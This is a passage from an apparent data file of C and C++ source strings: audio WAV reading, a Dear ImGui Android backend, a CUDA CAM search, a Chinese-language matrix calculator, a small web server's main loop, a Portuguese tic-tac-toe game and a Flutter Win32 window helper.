   }\n  } else {\n    // Read audio samples into a vector of float\n    wav_file.read(reinterpret_cast<char*>(float_samples.data()),\n                  wav_header.wav_size);\n  }\n\n  // Close the file\n  wav_file.close();\n\n  // Return the float_samples vector\n  return float_samples;\n}\n\nstd::vector<float> wav_read(const char* filename) {\n  std::vector<float> pcmf32;\n  drwav wav;\n  if (!drwav_init_file(&wav, filename, nullptr)) {\n    fprintf(stderr, \"failed to open WAV file '%s' - check your input\\n\",\n            filename);\n  }\n\n  if (wav.channels != 1 && wav.channels != 2) {\n    fprintf(stderr, \"WAV file '%s' must be mono or stereo\\n\", filename);\n  }\n\n  constexpr int kSampleRate = 16000;\n  if (wav.sampleRate != kSampleRate) {  // Update to use the correct sample rate\n    fprintf(stderr, \"WAV file '%s' must be 16 kHz\\n\", filename);\n  }\n\n  constexpr int kExpectedBitsPerSample = 16;\n  if (wav.bitsPerSample != kExpectedBitsPerSample) {\n    fprintf(stderr, \"WAV file '%s' must be 16-bit\\n\", filename);\n  }\n\n  std::vector<int16_t> pcm16;\n  pcm16.resize(wav.totalPCMFrameCount * wav.channels);\n  drwav_read_pcm_frames_s16(&wav, wav.totalPCMFrameCount, pcm16.data());\n  drwav_uninit(&wav);\n  // convert to mono, float\n  pcmf32.resize(wav.totalPCMFrameCount);\n  int n = wav.totalPCMFrameCount;\n  if (wav.channels == 1) {\n    for (int i = 0; i < n; i++) {\n      pcmf32[i] = static_cast<float>(pcm16[i]) / static_cast<float>(INT16_MAX);\n    }\n  } else {\n    for (int i = 0; i < n; i++) {\n      pcmf32[i] = static_cast<float>(pcm16[2 * i] + pcm16[2 * i + 1]) /\n                  static_cast<float>(INT32_MAX);\n    }\n  }\n  return pcmf32;\n}\n}  // namespace whisper\n",
    "// dear imgui: Platform Binding for Android native app\n// This needs to be used along with the OpenGL 3 Renderer (imgui_impl_opengl3)\n\n// Implemented features:\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy AKEYCODE_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen/Pen.\n// Missing features:\n//  [ ] Platform: Clipboard support.\n//  [ ] Platform: Gamepad support. Enable with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [ ] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'. FIXME: Check if this is even possible with Android.\n// Important:\n//  - Consider using SDL or GLFW backend on Android, which will be more full-featured than this.\n//  - FIXME: On-screen keyboard currently needs to be enabled by the application (see examples/ and issue #3446)\n//  - FIXME: Unicode character inputs needs to be passed by Dear ImGui by the application (see examples/ and issue #3446)\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyModsEvent() + io.SetKeyEventNativeData() API (1.87+). Support for full ImGuiKey range.\n//  2021-03-04: Initial version.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_android.h\"\n#include <time.h>\n#include <android/native_window.h>\n#include <android/input.h>\n#include <android/keycodes.h>\n#include <android/log.h>\n\n// Android data\nstatic double                                   g_Time = 0.0;\nstatic ANativeWindow*                           g_Window;\nstatic char                                     g_LogTag[] = \"ImGuiExample\";\n\nstatic ImGuiKey ImGui_ImplAndroid_KeyCodeToImGuiKey(int32_t key_code)\n{\n    switch (key_code)\n    {\n        case AKEYCODE_TAB:                  return ImGuiKey_Tab;\n        case AKEYCODE_DPAD_LEFT:            return ImGuiKey_LeftArrow;\n        case AKEYCODE_DPAD_RIGHT:           return ImGuiKey_RightArrow;\n        case AKEYCODE_DPAD_UP:              return ImGuiKey_UpArrow;\n        case AKEYCODE_DPAD_DOWN:            return ImGuiKey_DownArrow;\n        case AKEYCODE_PAGE_UP:              return ImGuiKey_PageUp;\n        case AKEYCODE_PAGE_DOWN:            return ImGuiKey_PageDown;\n        case AKEYCODE_MOVE_HOME:            return ImGuiKey_Home;\n        case AKEYCODE_MOVE_END:             return ImGuiKey_End;\n        case AKEYCODE_INSERT:               return ImGuiKey_Insert;\n        case AKEYCODE_FORWARD_DEL:          return ImGuiKey_Delete;\n        case AKEYCODE_DEL:                  return ImGuiKey_Backspace;\n        case AKEYCODE_SPACE:                return ImGuiKey_Space;\n        case AKEYCODE_ENTER:                return ImGuiKey_Enter;\n        case AKEYCODE_ESCAPE:               return ImGuiKey_Escape;\n        case AKEYCODE_APOSTROPHE:           return ImGuiKey_Apostrophe;\n        case AKEYCODE_COMMA:                return ImGuiKey_Comma;\n        case AKEYCODE_MINUS:                return ImGuiKey_Minus;\n        case AKEYCODE_PERIOD:               return ImGuiKey_Period;\n        case AKEYCODE_SLASH:                return ImGuiKey_Slash;\n        case AKEYCODE_SEMICOLON:            return ImGuiKey_Semicolon;\n        case AKEYCODE_EQUALS:               return ImGuiKey_Equal;\n        case AKEYCODE_LEFT_BRACKET:         return ImGuiKey_LeftBracket;\n        case AKEYCODE_BACKSLASH:            return ImGuiKey_Backslash;\n        case AKEYCODE_RIGHT_BRACKET:        return ImGuiKey_RightBracket;\n        case AKEYCODE_GRAVE:                return ImGuiKey_GraveAccent;\n        case AKEYCODE_CAPS_LOCK:            return ImGuiKey_CapsLock;\n        case AKEYCODE_SCROLL_LOCK:          return ImGuiKey_ScrollLock;\n        case AKEYCODE_NUM_LOCK:             return ImGuiKey_NumLock;\n        case AKEYCODE_SYSRQ:                return ImGuiKey_PrintScr",
    "#include \"function/search.h\"\n\n#include <chrono>\n#include <iostream>\n\n#include \"function/cuda/search.cuh\"\n// Define the search area based on the number of row and column CAMs.\n// Args:\n//  numRowCAMs (uint32_t): Number of row-wise CAM arrays.\n//  numColCAMs (uint32_t): Number of column-wise CAM arrays.\n// Sets the number of row and column CAMs for the search operation.\nvoid CAMSearch::defineSearchArea(uint32_t rowCams, uint32_t colCams) {\n  this->_rowCams = rowCams;\n  this->_colCams = colCams;\n}\n\n// Perform a search operation in CAM arrays.\n// Args:\n//     cam_data (array): Data stored in the CAM arrays.\n//     query_data (array): Query data for the search.\n// Returns:\n//     results (list): List of search results.\n// Searches in multiple CAM arrays, merges results, and returns a list of search\n// results. The operation of this function is designed to be performed in GPU.\nvoid CAMSearch::search(const CAMDataBase *camData, const QueryData *queryData,\n                       SimResult *simResult) {\n  assert(camData->getTotalNCol() == queryData->getTotalNCol());\n  assert(camData->getColSize() == queryData->getColSize());\n  assert(camData->getColCams() == queryData->getColCams());\n  assert(_colCams == camData->getColCams());\n  assert(_rowCams == camData->getRowCams());\n  assert(arrayConfig->row == camData->getRowSize());\n\n  auto start = std::chrono::high_resolution_clock::now();\n\n  CAMSearchCUDA(this, camData, queryData, simResult);\n\n  auto end = std::chrono::high_resolution_clock::now();\n  std::chrono::duration<double> diff = end - start;\n  std::cout << \"Search time: \" << diff.count() << \" s\\n\";\n};",
    "#include<stdio.h>\r\n#include<math.h>\r\n#include<stdlib.h>//\u5934\u6587\u4ef6 \r\nint i,j,m,n,p,q,k,x,y,order;//\r\nfloat result=0.0; //\u884c\u5217\u5f0f\u7ed3\u679c \r\nfloat determinant(float **a,int order);//\u884c\u5217\u5f0f\u51fd\u6570 \r\nfloat laplace(float **a,int r,int c,int order);//\u62c9\u666e\u62c9\u65af\u5c55\u5f00\u51fd\u6570 \r\nfloat inverse(float **a,int r,int c,int order); //\u9006\u77e9\u9635\u51fd\u6570 \r\nvoid print_inverse(float **a,int order);//\u8f93\u51fa\u9006\u77e9\u9635\u51fd\u6570 \r\nfloat adjoint(float **a,int r,int c,int order);//\u4f34\u968f\u77e9\u9635\u51fd\u6570 \r\nvoid print_adjoint(float **a,int order);//\u8f93\u51fa\u4f34\u968f\u77e9\u9635\u51fd\u6570 \r\nint main()\r\n{\r\n    printf(\"-----------------\u77e9\u9635\u8ba1\u7b97\u5668-----------------\\n\");\r\n    printf(\"------\u8bf7\u9009\u62e9\u529f\u80fd\uff1a\uff08\u9009\u62e9\u540e\u8bf7\u6309\u56de\u8f66\u952e\uff09  ----\\n\");\r\n    printf(\"------    0\uff1a\u9000\u51fa                -----------\\n\");\r\n    printf(\"------    1\uff1a\u8f6c\u7f6e\u77e9\u9635            -----------\\n\");\r\n    printf(\"------    2\uff1a\u77e9\u9635\u52a0\u6cd5            -----------\\n\");\r\n    printf(\"------    3\uff1a\u77e9\u9635\u4e58\u6cd5            -----------\\n\");\r\n    printf(\"------    4\uff1a\u77e9\u9635\u884c\u5217\u5f0f          -----------\\n\");\r\n    printf(\"------    5\uff1a\u9006\u77e9\u9635              -----------\\n\");\r\n    printf(\"------    6\uff1a\u4f34\u968f\u77e9\u9635            -----------\\n\");\r\n    printf(\"--------------------------------------------\\n\");//\u5934\u76ee \r\n    do\r\n    {\r\n    \tscanf(\"%d\",&x);//\u9009\u62e9\u9700\u8981\u8fdb\u884c\u7684\u529f\u80fd \r\n    \tswitch(x)\r\n    \t{\r\n    \t\tcase(0):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\\n\");\r\n    \t\t\tprintf(\"\u52a9\u6559\u522b\u5fd8\u4e86\u52a0\u5206\uff08\u4e00\u5b9a\u8981\u52a0\u5206\uff09\\n\"); \r\n    \t\t\tprintf(\"\u8bf7\u4ece0\u30011\u4e2d\u9009\u62e9\\n\");\r\n    \t\t\tprintf(\"0:\u5927\u6c14\u52a0\u5206\\n\");\r\n    \t\t\tprintf(\"1:\u5c31\u8fd9\uff1f\uff1f\uff1f\\n\");\r\n    \t\t\tdo\r\n\t\t\t\t{\r\n    \t\t\t  scanf(\"%d\",&y);\r\n    \t\t\t  switch(y) \r\n    \t\t\t  {\r\n    \t\t\t\t  case(0):\r\n    \t\t\t\t  {\r\n\t\t\t\t\t      printf(\"\\n\");\r\n    \t\t\t\t\t  printf(\"\u4e07\u5206\u611f\u8c22\uff0c\u52a9\u6559\u4f60\u6700\u597d\u770b\uff01  (\u70b9\u51fb\u4efb\u610f\u952e<\u522b\u70b9\u7535\u6e90\u952e\u3001num lock\u952e\u3001ctrl\u952e\u3001fn\u952e\u3001\u4e2d\u6587\u72b6\u6001\u4e0b\u7684\u5b57\u6bcd\u952e\u2026\u2026>\u9000\u51fa\u5594)\");\r\n\t\t\t\t\t  }\r\n\t\t\t\t\t  break;\r\n\t\t\t\t\t  case(1):\r\n\t\t\t\t\t  {\r\n\t\t\t\t\t\t  printf(\"\u5fd8\u4e86\u52a0\u5206\u5566 \uff08\u545c\u545c\u545c\u6ca1\u6709\u52a0\u5206  # __  #\uff09\\n\");\r\n\t\t\t\t\t\t  printf(\"\u8bf7\u518d\u6b21\u4ece0\u30011\u4e2d\u9009\u62e9\\n\");\r\n\t\t\t\t\t\t  printf(\"0\uff1a\u597d\u5427\u7ed9\u4f60\u52a0\u5206\\n\");\r\n\t\t\t\t\t\t  printf(\"1\uff1a\u5c31\u662f\u4e0d\u52a0\u5206\\n\");\r\n\t\t\t\t\t\t  printf(\"\\n\"); \r\n\t\t\t\t\t  }\r\n\t\t\t\t\t  break;\r\n\t\t\t\t  }\r\n\t\t\t    }\r\n\t\t\t    while(y);//\u5f53\u8f93\u51650\u65f6\u9000\u51fa\uff0c\u5426\u5219\u4e00\u76f4\u5faa\u73af \r\n\t\t    }\r\n\t\t\tbreak;\r\n\t\t\tcase(1):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\tfloat **a=(float**)malloc(sizeof(float*)*m);\r\n\t            int w;\r\n\t            for(w=0;w<m;w++)\r\n\t            a[w]=(float*)malloc(sizeof(float)*n);\r\n\t            float **b=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            b[w]=(float*)malloc(sizeof(float)*n);\r\n\t\t\t\twhile(m<=0||n<=0)//\u5224\u65ad\u662f\u5426\u5408\u6cd5 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u77e9\u9635\u4e0d\u5408\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&m,&n);\r\n\t\t\t\t} \r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\uff1a\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)//\u8f93\u5165 \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&a[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t            for(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            b[i][j]=a[j][i];\r\n\t\t            }\r\n\t            }\r\n\t            printf(\"\u8fd9\u662f\u8f6c\u7f6e\u77e9\u9635\uff1a\\n\");\r\n\t            for(i=0;i<m;i++)//\u8f93\u51fa \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            printf(\"%.2f\\t\",b[i][j]);\r\n\t\t            }\r\n\t\t            printf(\"\\n\");\r\n               \t}\r\n               \tprintf(\"\\n\");\r\n               \tprintf(\"\u9009\u62e90\u9000\u51fa\uff0c\u6216\u9009\u62e9\u4e0b\u4e00\u4e2a\u60f3\u6267\u884c\u7684\u529f\u80fd\\n\"); \r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t\tcase(2):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\u5728\u8fd9\u91cc\u8fdb\u884c\u77e9\u9635\u52a0\u6cd5\uff1a\\n\");\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\");\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&p,&q);\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\");\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\tfloat **a=(float**)malloc(sizeof(float*)*p);\r\n\t            int w;\r\n\t            for(w=0;w<p;w++)\r\n\t            a[w]=(float*)malloc(sizeof(float)*q);\r\n\t            float **b=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            b[w]=(float*)malloc(sizeof(float)*n);\r\n\t            float **c=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            c[w]=(float*)malloc(sizeof(float)*n);\r\n\t\t\t\twhile(p!=m||q!=n)//\u4e0d\u80fd\u76f8\u52a0\u91cd\u65b0\u8f93\u5165 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u8fd9\u4e24\u4e2a\u77e9\u9635\u4e0d\u80fd\u76f8\u52a0\u3002\\n\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u91cd\u65b0\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570,\u4f7f\u4e4b\u4e0e\u77e9\u9635a\u7684\u884c\u6570\u5217\u6570\u4e00\u81f4\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\t}\r\n\t\t\t\twhile(m<=0||n<=0||p<=0||q<=0)//\u5224\u65ad\u662f\u5426\u5408\u6cd5 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u77e9\u9635\u4e0d\u5408\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&p,&q);\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&m,&n);\r\n\t\t\t\t} \r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<p;i++)//\u8f93\u5165 \r\n\t            {\r\n\t\t            for(j=0;j<q;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&a[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&b[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t\t\t\tprintf(\"\u4e24\u4e2a\u77e9\u9635\u76f8\u52a0\u7ed3\u679c\u4e3a\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            c[i][j]=a[i][j]+b[i][j];//\u76f8\u52a0\u8ba1\u7b97 \r\n\t\t            }\r\n\t            }\r\n\t\t\t\tfor(i=0;i<m;i++)//\u8f93\u51fa \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            printf(\"%.2f\\t\",c[i][j]);\r\n\t\t            }\r\n\t\t            printf(\"\\n\");\r\n\t            }\r\n\t            printf(\"\\n\");\r\n               \t",
    "#include \"common.hpp\"\n#include \"ReadConfig.hpp\"\n#include \"ReadConfig.hpp\"\n#include \"Server.hpp\"\n\nvoid handleSigint(std::vector<Server> servers) {\n    for (std::vector<Server>::iterator it = servers.begin(); it != servers.end(); it++)\n\t\tit->handleSigint();\n    exit(EXIT_SUCCESS);\n}\n\nint main (int argc, char** argv){\n\n\t\n\n\tif (argc < 2) {\n\t\tstd::cerr << \"Missing config file as argument\" << std::endl;\n\t\treturn (1);\n\t}\n\tif (argc > 2){\n\t\tstd::cerr << COLOR_ERROR << \"Error: More than one argument.\" << COLOR_STANDARD << std::endl;\n\t\treturn (1);\n\t}\n\tsignal(SIGPIPE, signal_handler);\n    signal(SIGINT, signal_handler);\n\n\ttry {\n\t\t//read file content into token queue\n\t\tstd::deque<std::string> tokens = readFile2Buffer(argv[1]);\n\t\t// printTokens(tokens);\n\t\t//analize tokens to create server and location blocks \n\t\tstd::vector<ServerConfig> configs = parseConfig(tokens);\n\t\t//remove duplicated host:ip servers\n\t\tremoveConfDuplicates(configs);\n\t\t//fill unset server directives with reference (./config_files/default.conf)\n\t\t//fill 1st level location directives with reference values\n\t\t//fill unset directives in nested locations with parent directories \n\t\tfillUnsetDirectives(configs);\n\n\t\t//set up servers\n\t\tstd::vector<Server> servers;\n\t\tfor (unsigned long i = 0; i < configs.size(); ++i) {\n\t\t\ttry {\n\t\t\t\tServer serv(configs[i]);\n\t\t\t\tservers.push_back(serv);\n\t\t\t\tstd::cout << \"Created server with host: \" << configs[i].getHost() << std::endl;\n\t\t\t} catch (const std::exception& e) {\n\t\t\t\tstd::cout << \"Failed to create server with host: \" << configs[i].getHost() << \"\\n\" << e.what() << std::endl;\n\t\t\t}\n\t\t}\n\t\tif (servers.size() < 1)\n\t\t\texit(1);\n\t\twhile (true) {\n\t\t\tfor (size_t i = 0; i < servers.size(); ++i) {\n\t\t\t\tif (g_signal_received == SIGINT)\n\t\t\t\t\thandleSigint(servers);\n\t\t\t\tservers[i].serverRun();\n\t\t\t}\n\t\t}\n\t} catch (const std::exception& e) {\n\t\tstd::cerr << COLOR_ERROR << \"Error: \" << e.what() << COLOR_STANDARD << std::endl;\n\t\treturn (1);\n\t}\n\n\treturn (0);\n}",
    "#include <iostream>\r\n#include <ctime>\r\n\r\nvoid drawBoard(char *spaces);\r\nvoid playerMove(char *spaces, char player);\r\nvoid computerMove(char *spaces, char computer);\r\nbool checkWinner(char *spaces, char player, char computer);\r\nbool checkTie(char *spaces);\r\n\r\nint main() {\r\n    char player = 'X';\r\n    char computer = 'O';\r\n    char spaces[9] = {' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '};\r\n    bool winner, tie;\r\n    drawBoard(spaces);\r\n\r\n    while(true) {\r\n        playerMove(spaces, player);\r\n        drawBoard(spaces);\r\n\r\n        winner = checkWinner(spaces, player, computer);\r\n        if (winner) {\r\n            break;\r\n        }\r\n        tie = checkTie(spaces);\r\n        if (tie) {\r\n            break;\r\n        }\r\n        computerMove(spaces, computer);\r\n        drawBoard(spaces);\r\n\r\n        winner = checkWinner(spaces, player, computer);\r\n        if (winner) {\r\n            break;\r\n        }\r\n        tie = checkTie(spaces);\r\n        if (tie) {\r\n            break;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nvoid drawBoard(char *spaces){\r\n    std::cout << '\\n';\r\n    std::cout << \"     |     |     \" << std::endl;\r\n    std::cout << \"  \" << spaces[0] <<\"  |  \"<< spaces[1] <<\"  |  \" << spaces[2] << \"  \" << std::endl;\r\n    std::cout << \"_____|_____|_____\" << std::endl;\r\n    std::cout << \"     |     |     \" << std::endl;\r\n    std::cout << \"  \" << spaces[3] <<\"  |  \"<< spaces[4] <<\"  |  \" << spaces[5] << \"  \" << std::endl;\r\n    std::cout << \"_____|_____|_____\" << std::endl;\r\n    std::cout << \"     |     |     \" << std::endl;\r\n    std::cout << \"  \" << spaces[6] <<\"  |  \"<< spaces[7] <<\"  |  \" << spaces[8] << \"  \" << std::endl;\r\n    std::cout << \"     |     |     \" << std::endl;\r\n    std::cout << '\\n';\r\n}\r\nvoid playerMove(char *spaces, char player){\r\n    int pos;\r\n    while(true){\r\n        std::cout << \"Escolha onde quer jogar [1-9]: \";\r\n        std::cin >> pos;\r\n        pos--;\r\n        if ((pos >= 0 && pos <= 8) && spaces[pos] == ' ') {\r\n            spaces[pos] = player;\r\n            break;\r\n        }\r\n    }\r\n}\r\nvoid computerMove(char *spaces, char computer){\r\n    srand(time(0));\r\n    int pos;\r\n    while (true) {\r\n        pos = rand() % 9;\r\n        if (spaces[pos] == ' '){\r\n            spaces[pos] = computer;\r\n            return;\r\n        } \r\n    }\r\n}\r\nbool checkWinner(char *spaces, char player, char computer){\r\n    if (spaces[0] != ' ' && spaces[0] == spaces[1] && spaces[1] == spaces[2]){\r\n        // someone wins\r\n        if (spaces[0] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[3] != ' ' && spaces[3] == spaces[4] && spaces[4] == spaces[5]){\r\n        // someone wins\r\n        if (spaces[3] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[6] != ' ' && spaces[6] == spaces[7] && spaces[7] == spaces[8]){\r\n        // someone wins\r\n        if (spaces[6] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[0] != ' ' && spaces[0] == spaces[3] && spaces[3] == spaces[6]){\r\n        // someone wins\r\n        if (spaces[0] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[1] != ' ' && spaces[1] == spaces[4] && spaces[4] == spaces[7]){\r\n        // someone wins\r\n        if (spaces[1] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[2] != ' ' && spaces[2] == spaces[5] && spaces[5] == spaces[8]){\r\n        // someone wins\r\n        if (spaces[2] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[0] != ' ' && spaces[0] == spaces[4] && spaces[4] == spaces[8]){\r\n        // someone wins\r\n        if (spaces[0] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[2] != ' ' && spaces[2] == spaces[4] && spaces[4] == spaces[6]){\r\n        // someone wins\r\n        if (spaces[2] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\nbool checkTie(char *spaces){\r\n    for (int i=0; i < 9; i++) {\r\n        if (spaces[i] == ' ') {\r\n            return false;\r\n        }\r\n    }\r\n    std",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* 